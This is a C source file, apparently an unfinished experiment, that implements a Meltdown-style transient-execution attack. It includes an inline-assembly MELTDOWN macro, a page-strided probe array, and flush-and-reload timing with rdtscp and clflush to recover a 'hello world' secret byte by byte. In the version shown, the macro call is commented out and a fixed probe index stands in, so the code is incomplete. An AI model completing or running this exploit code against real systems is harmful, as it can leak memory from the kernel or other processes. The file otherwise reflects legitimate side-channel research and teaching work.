/*
	main c file
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "urd00m_output.h"
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DEBUG 1
#define RETRIES 1000
#define THRESHOLD 90

// Downside of this implementation, can't read 0 values 
#define MELTDOWN(addr) \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $12, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");


/*
Helper functions 
 */
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

// measures access time, if hit return 1 else return 0;
static inline int flush_reload(void *p) {
  return 0;
}


/*
  Global vars 
 */
int * rec; 
char secret[100] = "hello world\n";

/*
  Meltdown setup code 
 */
void init() {
  // setup recieving array
  rec = (int *) malloc(sizeof(*rec) * 300 * 4096); // page stride
  rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
  for(int i = 0; i < 256; i++) {
    _mm_clflush(&rec[i * 4096]); //flush it from memory 
  }

  INFO("Init finished\n");
}


/*
  Read reciever bytes 
 */
int __attribute__((always_inline)) read_byte_from_reciever() {
  int junk = 0;
  int min_value = 1000; //which ever one has the lowest time to access
  int min_idx = -1;

  // measure
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255;

    // timing
    int* addr = &rec[mix_i * 4096];
    int start = __rdtscp(&junk);
    maccess((void*)addr); 
    int elapsed = __rdtscp(&junk) - start;

    // flush it 
    flush(addr);
    
    // check time 
    if(elapsed < min_value) {
      min_value = elapsed;
      min_idx = mix_i;
    }
  }

  return min_idx;
}

char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
  char* ret = malloc(100); // 100 characters
  memset(ret, '\0', 100); // 0 out
  size_t size = strlen(addr);

  // get string 
  for(int i = 0; i < size; i++) {
    // hit counter
    int hit[256];
    for(int j = 0; j < 256; j++) hit[j] = 0; 

    // do RETRIES
    for(int j = 0; j < RETRIES; j++) {
      // meltdown attack into cache 
      //MELTDOWN(addr);

      volatile int* p = &rec[60 * 4096];
      maccess((void*)p); 
            
      // recieve 
      int value = read_byte_from_reciever(addr);

      hit[value]++;
      sched_yield();
    }
    
    // find max
    int max = 0;
    int max_idx = -1;
    for(int j = 0; j < 256; j++) {
      if(hit[j] > max) {
	max = hit[j];
	max_idx = j;
      }
    }
    
    // add ret
    char byte_value = (char)max_idx;
    strncat(ret, &byte_value, 1); //concatenate strings
   
#if DEBUG
    INFO("byte value read: %d\n", max_idx);
#endif
    
    // next byte 
    addr++;
  }
   
  return ret; 
}

/*
  Main function
*/
int main(void) {
  // create reciever 
  init();

  // attempt read
  char *guess = read_string(secret);
  ERROR("String is: %s\n", guess);
  
  return 0;
}
